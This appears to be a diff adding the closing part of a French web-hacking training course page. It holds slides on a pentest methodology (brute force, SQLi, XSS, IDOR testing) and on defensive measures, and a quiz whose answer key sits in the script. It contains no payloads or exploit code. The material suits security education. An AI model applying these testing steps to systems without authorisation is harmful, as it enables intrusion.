+      <div><div style="font-family:var(--display);font-size:.8rem;color:#fff;margin-bottom:.3rem">RECONNAISSANCE</div><div style="font-family:var(--body);font-size:.78rem;color:rgba(220,200,180,.7)">Identifier la technologie (Wappalyzer), lister les endpoints, mapper les fonctionnalités</div></div>
+    </div>
+    <div style="display:flex;align-items:flex-start;gap:1rem;padding:.8rem 1rem;border:1px solid rgba(255,136,0,.15);background:rgba(255,136,0,.03)">
+      <div style="font-family:var(--display);font-size:1.2rem;font-weight:900;color:#ff8800;min-width:28px">02</div>
+      <div><div style="font-family:var(--display);font-size:.8rem;color:#fff;margin-bottom:.3rem">AUTHENTIFICATION</div><div style="font-family:var(--body);font-size:.78rem;color:rgba(220,200,180,.7)">Tester le login (brute force, SQLi), analyser les cookies de session, vérifier le MFA</div></div>
+    </div>
+    <div style="display:flex;align-items:flex-start;gap:1rem;padding:.8rem 1rem;border:1px solid rgba(255,136,0,.15);background:rgba(255,136,0,.03)">
+      <div style="font-family:var(--display);font-size:1.2rem;font-weight:900;color:#ff8800;min-width:28px">03</div>
+      <div><div style="font-family:var(--display);font-size:.8rem;color:#fff;margin-bottom:.3rem">ENTRÉES UTILISATEUR</div><div style="font-family:var(--body);font-size:.78rem;color:rgba(220,200,180,.7)">Tester chaque input (SQLi, XSS, CSRF), les uploads de fichiers, les paramètres cachés</div></div>
+    </div>
+    <div style="display:flex;align-items:flex-start;gap:1rem;padding:.8rem 1rem;border:1px solid rgba(255,136,0,.15);background:rgba(255,136,0,.03)">
+      <div style="font-family:var(--display);font-size:1.2rem;font-weight:900;color:#ff8800;min-width:28px">04</div>
+      <div><div style="font-family:var(--display);font-size:.8rem;color:#fff;margin-bottom:.3rem">CONTRÔLE D'ACCÈS</div><div style="font-family:var(--body);font-size:.78rem;color:rgba(220,200,180,.7)">Tester les IDOR, accès horizontal/vertical, endpoints admin non protégés</div></div>
+    </div>
+    <div style="display:flex;align-items:flex-start;gap:1rem;padding:.8rem 1rem;border:1px solid rgba(255,136,0,.15);background:rgba(255,136,0,.03)">
+      <div style="font-family:var(--display);font-size:1.2rem;font-weight:900;color:#ff8800;min-width:28px">05</div>
+      <div><div style="font-family:var(--display);font-size:.8rem;color:#fff;margin-bottom:.3rem">RAPPORT</div><div style="font-family:var(--body);font-size:.78rem;color:rgba(220,200,180,.7)">Documenter chaque vulnérabilité : description, impact, preuve (PoC), recommandations</div></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" data-index="9">
+  <div class="slide-tag">// 09 · Défense Web</div>
+  <h2>Comment sécuriser une application web ?</h2>
+  <div class="grid2">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.6rem">🛡️ DÉVELOPPEMENT SÉCURISÉ</div>
+      <ul class="bullets">
+        <li class="ok"><strong>Valider</strong> toutes les entrées côté serveur (pas seulement client)</li>
+        <li class="ok"><strong>Prepared statements</strong> pour toutes les requêtes SQL</li>
+        <li class="ok"><strong>Encoder</strong> les sorties HTML (pas de innerHTML avec data user)</li>
+        <li class="ok">Principe du <strong>moindre privilège</strong> en base de données</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.6rem">⚙️ CONFIGURATION SERVEUR</div>
+      <ul class="bullets">
+        <li class="ok"><strong>HTTPS</strong> obligatoire + HSTS header</li>
+        <li class="ok"><strong>CSP</strong> (Content Security Policy) pour bloquer le XSS</li>
+        <li class="ok"><strong>WAF</strong> (Web Application Firewall)</li>
+        <li class="ok">Mise à jour régulière des <strong>dépendances</strong> et frameworks</li>
+        <li class="ok">Logs et <strong>monitoring</strong> des accès anormaux</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="slide" data-index="10">
+  <div class="slide-tag">// Récap · Web Hacking</div>
+  <h2>Ce qu'on a vu</h2>
+  <div class="grid2" style="max-width:820px">
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(255,136,0,.4);margin-bottom:.7rem">✅ ACQUIS</div>
+      <ul class="bullets">
+        <li class="ok">Architecture web et flux HTTP</li>
+        <li class="ok">Injection SQL — théorie et exploitation</li>
+        <li class="ok">XSS — reflected, stored, DOM</li>
+        <li class="ok">OWASP Top 10 — les vulnérabilités critiques</li>
+        <li class="ok">IDOR et Broken Access Control</li>
+        <li class="ok">Méthodologie pentest web</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div style="font-size:.65rem;letter-spacing:.2em;color:rgba(0,255,136,.4);margin-bottom:.7rem">🚀 POUR ALLER PLUS LOIN</div>
+      <ul class="bullets">
+        <li><strong>DVWA</strong> — app volontairement vulnérable pour s'entraîner</li>
+        <li><strong>PortSwigger Web Academy</strong> — labs gratuits et excellents</li>
+        <li><strong>HackTheBox / TryHackMe</strong> — CTF web</li>
+        <li><strong>Bug Bounty</strong> — HackerOne, Bugcrowd pour gagner de l'argent</li>
+      </ul>
+      <div style="margin-top:.8rem"><span class="pill pill-orange">🌐 Le web = surface d'attaque #1</span></div>
+    </div>
+  </div>
+  <div style="margin-top:1.5rem;text-align:center">
+    <div class="gabon-bar" style="margin:0 auto"><span></span><span></span><span></span></div>
+    <div style="font-size:.65rem;color:rgba(255,136,0,.25);margin-top:.7rem;letter-spacing:.1em">SooPHA Learn × Web Hacking × Afrique Francophone</div>
+  </div>
+</div>
+
+</div>
+<div id="qcm-overlay">
+  <div class="qcm-box">
+    <div class="qcm-header">
+      <span class="qcm-label">// QCM — Vérification</span>
+      <span class="qcm-prog" id="qcm-prog"></span>
+    </div>
+    <div class="qcm-saving" id="qcm-saving">⏳ Sauvegarde en cours...</div>
+    <div class="qcm-question" id="qcm-question"></div>
+    <div class="qcm-options" id="qcm-options"></div>
+    <div class="qcm-feedback" id="qcm-feedback"></div>
+    <button class="qcm-btn" id="qcm-next-btn" onclick="closeQcmAndAdvance()">CONTINUER →</button>
+  </div>
+</div>
+<div id="completion-modal">
+  <div class="completion-box">
+    <div class="completion-icon" id="comp-icon">🏆</div>
+    <div class="completion-title" id="comp-title">Formation terminée !</div>
+    <div class="completion-score" id="comp-score">--%</div>
+    <div class="completion-sub" id="comp-sub"></div>
+    <div class="completion-saved">💾 Progression sauvegardée dans ton profil</div>
+    <div>
+      <a href="dashboard.html" class="completion-btn completion-btn-primary">← Dashboard</a>
+      <button class="completion-btn completion-btn-secondary" onclick="document.getElementById('completion-modal').classList.remove('show')">Revoir</button>
+    </div>
+  </div>
+</div>
+<div id="bottombar">
+  <button class="nav-btn" id="prev-btn" onclick="navigate(-1)" disabled>← PRÉCÉDENT</button>
+  <div style="display:flex;align-items:center;gap:1.5rem">
+    <span class="qcm-indicator" id="qcm-ind"></span>
+    <span id="slide-counter">01 / 11</span>
+  </div>
+  <button class="nav-btn" id="next-btn" onclick="navigate(1)">SUIVANT →</button>
+</div>
+<script>
+var QCM = {
+  2: { question:"Quel flag HTTP protège un cookie contre le vol par XSS ?", options:["Secure", "HttpOnly", "SameSite", "Encrypted"], correct:1, explanation:"Le flag HttpOnly empêche JavaScript d'accéder au cookie, le protégeant contre le vol par XSS. Le flag Secure force la transmission uniquement via HTTPS." },
+  3: { question:"Burp Suite est principalement utilisé pour :", options:["Scanner les ports réseau", "Intercepter et modifier les requêtes HTTP", "Craquer des mots de passe", "Analyser des fichiers malveillants"], correct:1, explanation:"Burp Suite est un proxy HTTP qui s'intercale entre le navigateur et le serveur pour capturer, modifier et rejouer les requêtes. C'est l'outil standard des pentesteurs web." },
+  4: { question:"Quelle est la meilleure protection contre les injections SQL ?", options:["Filtrer les guillemets simples", "Utiliser des requêtes préparées (prepared statements)", "Chiffrer la base de données", "Utiliser un WAF uniquement"], correct:1, explanation:"Les requêtes préparées séparent le code SQL des données utilisateur. Même si l'utilisateur entre du code SQL, il sera traité comme une donnée et non comme du code." },
+  5: { question:"Quel type de XSS est le plus dangereux car il persiste en base de données ?", options:["Reflected XSS", "Stored XSS", "DOM XSS", "Blind XSS"], correct:1, explanation:"Le Stored XSS est stocké en base de données et s'exécute pour chaque visiteur de la page. Un seul exploit touche tous les utilisateurs, contrairement au Reflected XSS qui ne touche qu'une victime à la fois." },
+  6: { question:"Selon l'OWASP, quelle vulnérabilité est classée A01 (la plus critique) en 2021 ?", options:["Injection SQL", "Broken Access Control", "Cryptographic Failures", "XSS"], correct:1, explanation:"Broken Access Control est passé de la 5e à la 1ère place dans l'OWASP Top 10 2021. 94% des applications testées avaient des problèmes de contrôle d'accès." },
+  7: { question:"Un IDOR permet d'accéder aux données d'un autre utilisateur en :", options:["Devinant son mot de passe", "Modifiant un identifiant dans l'URL ou la requête", "Exploitant une faille JavaScript", "Usurpant son adresse email"], correct:1, explanation:"IDOR (Insecure Direct Object Reference) consiste à modifier directement un ID (numéro de compte, ID utilisateur) dans une URL ou requête pour accéder aux données d'autrui." },
+  8: { question:"Dans une méthodologie pentest web, quelle est la première étape ?", options:["Tenter de se connecter avec admin/admin", "La reconnaissance — identifier les technologies et endpoints", "Lancer sqlmap sur tous les paramètres", "Vérifier le certificat SSL"], correct:1, explanation:"La reconnaissance est toujours la première étape. Il faut comprendre ce qu'on teste avant d'attaquer : technologies utilisées, endpoints disponibles, fonctionnalités de l'application." },
+};
+var COURSE_ID="web",TOTAL=11,current=0,currentUser=null,qcmAnswered={},qcmScores={},currentQcmSlide=null;
+async function init(){
+  currentUser=await requireAuth();if(!currentUser)return;
+  var p=await getProfile(currentUser.id);
+  document.getElementById("tb-username").textContent="@"+((p&&p.username)||"user");
+  var saved=await getCourseProgress(currentUser.id,COURSE_ID);
+  saved.forEach(function(r){qcmAnswered[r.slide_index]=true;qcmScores[r.slide_index]=r.is_correct?1:0;});
+  updateUI();
+}
+function navigate(dir){
+  var next=current+dir;if(next<0||next>=TOTAL)return;
+  if(dir>0&&QCM[current]&&!qcmAnswered[current]){showQcm(current);return;}
+  var curEl=document.querySelector(".slide.active"),nextEl=document.querySelector(".slide[data-index=\""+next+"\"]");
+  curEl.classList.remove("active");curEl.classList.add("exit");
+  setTimeout(function(){curEl.classList.remove("exit");},400);
+  nextEl.classList.add("active");current=next;updateUI();
+}
+function updateUI(){
+  document.getElementById("slide-counter").textContent=String(current+1).padStart(2,"0")+" / "+String(TOTAL).padStart(2,"0");
+  document.getElementById("prev-btn").disabled=current===0;
+  document.getElementById("next-btn").disabled=current===TOTAL-1;
+  document.getElementById("progress-fill").style.width=((current+1)/TOTAL*100)+"%";
+  var ind=document.getElementById("qcm-ind");
+  if(QCM[current])ind.textContent=qcmAnswered[current]?(qcmScores[current]===1?"✅ QCM répondu":"❌ QCM répondu"):"⚡ QCM requis";
+  else ind.textContent="";
+}
+function showQcm(idx){
+  var qcm=QCM[idx];if(!qcm)return;
+  currentQcmSlide=idx;
+  document.getElementById("qcm-prog").textContent="QCM "+(Object.keys(qcmAnswered).length+1)+" / "+Object.keys(QCM).length;
+  document.getElementById("qcm-question").textContent=qcm.question;
+  document.getElementById("qcm-feedback").style.display="none";
+  document.getElementById("qcm-feedback").className="qcm-feedback";
+  document.getElementById("qcm-next-btn").classList.remove("show");
+  document.getElementById("qcm-saving").classList.remove("show");
+  var letters=["A","B","C","D"],html="";
+  qcm.options.forEach(function(opt,i){html+='<div class="qcm-option" onclick="selectOption(this,'+i+')"><span class="option-letter">'+letters[i]+"</span>"+opt+"</div>";});
+  document.getElementById("qcm-options").innerHTML=html;
+  if(qcmAnswered[idx]){restoreQcmState(idx);document.getElementById("qcm-next-btn").classList.add("show");}
+  document.getElementById("qcm-overlay").classList.add("show");
+}
+async function selectOption(el,optIdx){
+  if(qcmAnswered[currentQcmSlide])return;
+  var qcm=QCM[currentQcmSlide],correct=optIdx===qcm.correct;
+  document.querySelectorAll(".qcm-option").forEach(function(o,i){o.classList.add("disabled");if(i===qcm.correct)o.classList.add("correct");});
+  if(!correct)el.classList.add("wrong");
+  var fb=document.getElementById("qcm-feedback");
+  fb.style.display="block";fb.className="qcm-feedback "+(correct?"correct":"wrong");
+  fb.textContent=(correct?"✅ Correct ! ":"❌ Incorrect. ")+qcm.explanation;
+  qcmAnswered[currentQcmSlide]=true;qcmScores[currentQcmSlide]=correct?1:0;updateUI();
+  if(currentUser){
+    document.getElementById("qcm-saving").classList.add("show");
+    await saveQcmProgress(currentUser.id,COURSE_ID,currentQcmSlide,correct);
+    document.getElementById("qcm-saving").classList.remove("show");
+    if(Object.keys(qcmAnswered).length===Object.keys(QCM).length){
+      var tot=Object.keys(QCM).length,c=Object.values(qcmScores).filter(function(v){return v===1;}).length;
+      var pct=(c/tot)*100;
+      await completeCourse(currentUser.id,COURSE_ID,pct);
+      setTimeout(function(){closeQcmAndAdvance();showCompletion(pct);},1200);
+      return;
+    }
+  }
+  document.getElementById("qcm-next-btn").classList.add("show");
+}
+function restoreQcmState(idx){
+  var qcm=QCM[idx],score=qcmScores[idx];
+  document.querySelectorAll(".qcm-option").forEach(function(o,i){o.classList.add("disabled");if(i===qcm.correct)o.classList.add("correct");});
+  var fb=document.getElementById("qcm-feedback");
+  fb.style.display="block";fb.className="qcm-feedback "+(score===1?"correct":"wrong");
+  fb.textContent=(score===1?"✅ Déjà répondu. ":"❌ Réponse incorrecte. ")+qcm.explanation;
+}
+function closeQcmAndAdvance(){
+  document.getElementById("qcm-overlay").classList.remove("show");
+  if(currentQcmSlide===current&&current<TOTAL-1){
+    var next=current+1,curEl=document.querySelector(".slide.active"),nextEl=document.querySelector(".slide[data-index=\""+next+"\"]");
+    curEl.classList.remove("active");curEl.classList.add("exit");
+    setTimeout(function(){curEl.classList.remove("exit");},400);
+    nextEl.classList.add("active");current=next;updateUI();
+  }
+}
+function showCompletion(pct){
+  var tot=Object.keys(QCM).length,c=Object.values(qcmScores).filter(function(v){return v===1;}).length;
+  document.getElementById("comp-score").textContent=Math.round(pct)+"%";
+  if(pct>=70){document.getElementById("comp-icon").textContent="🏆";document.getElementById("comp-title").textContent="Excellent !";document.getElementById("comp-sub").textContent=c+" / "+tot+" bonnes réponses. Cours maîtrisé !";}
+  else{document.getElementById("comp-icon").textContent="📚";document.getElementById("comp-title").textContent="Formation terminée";document.getElementById("comp-sub").textContent=c+" / "+tot+" bonnes réponses. Révise pour améliorer ton score.";}
+  document.getElementById("completion-modal").classList.add("show");
+}
+document.addEventListener("keydown",function(e){
+  if(document.getElementById("qcm-overlay").classList.contains("show"))return;
+  if(e.key==="ArrowRight"||e.key===" "){e.preventDefault();navigate(1);}
+  if(e.key==="ArrowLeft")navigate(-1);
+});
+var touchX=0;
+document.addEventListener("touchstart",function(e){touchX=e.touches[0].clientX;});
+document.addEventListener("touchend",function(e){
+  var dx=e.changedTouches[0].clientX-touchX;
+  if(Math.abs(dx)>50&&!document.getElementById("qcm-overlay").classList.contains("show"))navigate(dx<0?1:-1);
+});
+(function(){
+  var c=document.getElementById("matrix"),ctx=c.getContext("2d");
+  function resize(){c.width=window.innerWidth;c.height=window.innerHeight;}
+  resize();window.addEventListener("resize",resize);
+  var chars="01ABCDEF{}CTFFlag",fs=13,drops;
+  function init(){drops=Array(Math.floor(c.width/fs)).fill(1);}
+  init();window.addEventListener("resize",init);
+  setInterval(function(){
+    ctx.fillStyle="rgba(2,4,12,0.05)";ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle="#ff8800";ctx.font=fs+"px monospace";
+    drops.forEach(function(y,i){
+      ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*fs,y*fs);
+      if(y*fs>c.height&&Math.random()>.975)drops[i]=0;
+      drops[i]++;
+    });
+  },55);
+})();
+init();
+</script>
+</body>
+</html>
